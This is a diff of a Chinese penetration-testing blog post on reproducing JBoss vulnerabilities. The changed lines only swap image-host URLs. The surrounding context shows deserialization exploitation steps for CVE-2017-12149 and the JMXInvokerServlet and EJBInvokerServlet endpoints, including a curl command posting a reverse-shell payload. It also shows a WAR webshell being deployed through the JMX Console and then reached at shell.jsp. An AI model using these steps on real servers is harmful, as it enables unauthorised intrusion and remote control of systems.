@@ -1,7 +1,7 @@
 ---
 title: jboss常见漏洞复现
 top: false
-cover: http://image.xpshuai.cn/jboss_500.png
+cover: http://image.geoer.cn/jboss_500.png
 categories:
 - 渗透测试
 tags:
@@ -19,7 +19,7 @@ password:
 
 ### JBoss 5.x/6.x 反序列化漏洞( CVE-2017-12149 )
 **验证：** 访问`/invoker/readonly`，如果返回 500 ,说明页面存在,此页面存在反序列化漏洞。
-![](http://image.xpshuai.cn/jboss_500.png)
+![](http://image.geoer.cn/jboss_500.png)
 
 利用工具：[JavaDeserH2HC](https://github.com/joaomatosf/JavaDeserH2HC)
 **步骤：**
@@ -54,7 +54,7 @@ curl http://192.168.0.100:8080/invoker/readonly --data-binary @ReverseShellCommo
 
 ### JBoss JMXInvokerServlet 反序列化漏洞
 **验证：**  访问 `/invoker/JMXInvokerServlet`，返回如下,说明接口开放,此接口存在反序列化漏洞。
-![](http://image.xpshuai.cn/JBossEJBInvokerServlet1.png)
+![](http://image.geoer.cn/JBossEJBInvokerServlet1.png)
 
 这里直接利用 CVE-2017-12149 生成的 ser ,发送到 `/invoker/JMXInvokerServlet`接口中。
 
@@ -67,7 +67,7 @@ java -jar DeserializeExploit.jar
 
 ### JBoss EJBInvokerServlet 反序列化漏洞
 **验证：** 访问     /invoker/EJBInvokerServlet    返回如下,说明接口开放,此接口存在反序列化漏洞。
-![](http://image.xpshuai.cn/JBossEJBInvokerServlet.png)
+![](http://image.geoer.cn/JBossEJBInvokerServlet.png)
 
 这里直接利用 CVE-2017-12149 生成的 ser ,发送到 `/invoker/EJBInvokerServlet` 接口中
 
@@ -130,10 +130,10 @@ http://192.168.0.100:8080/
 # 进入控制页 JMX Console
 http://192.168.0.100:8080/jmx-console/ 
 ```
-![](http://image.xpshuai.cn/jmx_console.png)
+![](http://image.geoer.cn/jmx_console.png)
 
 2.点击`jboss.deployment`进入应用部署页面
-![](http://image.xpshuai.cn/jboss_deployment.png)
+![](http://image.geoer.cn/jboss_deployment.png)
 
 3.使用apache搭建远程木马服务器(这里在kali上搭建)
 
@@ -147,17 +147,17 @@ jar cvf shell.war shell.jsp
 ```
 地址写远程服务器war马的地址
 ```
-![](http://image.xpshuai.cn/jboss_war.png)
+![](http://image.geoer.cn/jboss_war.png)
 
 成功部署
-![](http://image.xpshuai.cn/jboss_war_ok.png)
+![](http://image.geoer.cn/jboss_war_ok.png)
 
 5.连接木马
 
 ```
 http://192.168.0.100:8080/shell/shell.jsp
 ```
-![](http://image.xpshuai.cn/jboss_war_connect.png)
+![](http://image.geoer.cn/jboss_war_connect.png)
 
 
 
